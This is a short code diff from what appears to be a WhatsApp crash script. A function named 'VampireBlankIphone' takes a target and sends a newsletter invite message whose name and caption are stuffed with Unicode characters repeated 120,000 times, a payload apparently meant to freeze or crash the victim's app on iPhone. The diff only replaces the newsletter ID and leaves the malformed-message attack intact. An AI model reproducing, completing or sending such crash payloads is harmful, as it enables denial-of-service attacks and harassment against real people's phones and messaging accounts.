@@ -6,7 +6,7 @@ async function VampireBlankIphone(target) {
             botInvokeMessage: {
                 message: {
                     newsletterAdminInviteMessage: {
-                        newsletterJid: `120363428492698734@newsletter`,
+                        newsletterJid: `33333333333333333@newsletter`,
                         newsletterName: "𝐆𝐫𝐢𝐦𝐑𝐞𝐚𝐩𝐞𝐫" + "ી".repeat(120000),
                         jpegThumbnail: "",
                         caption: "ꦽ".repeat(120000),
